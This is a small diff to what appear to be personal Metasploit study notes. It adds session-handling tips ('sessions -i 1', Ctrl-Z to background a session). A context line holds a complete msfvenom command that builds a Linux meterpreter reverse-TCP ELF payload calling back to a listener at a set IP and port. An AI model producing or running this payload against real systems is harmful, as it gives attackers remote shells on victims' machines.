@@ -21,6 +21,11 @@ tree -L 1 auxiliary
 
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.4.20.232 LPORT=1234 -f elf > rev_shell.elf
 
+CTRL Z to background a session
+sessions -i 1 to select number 1 in the session
+sessions
+
+
 
 
 
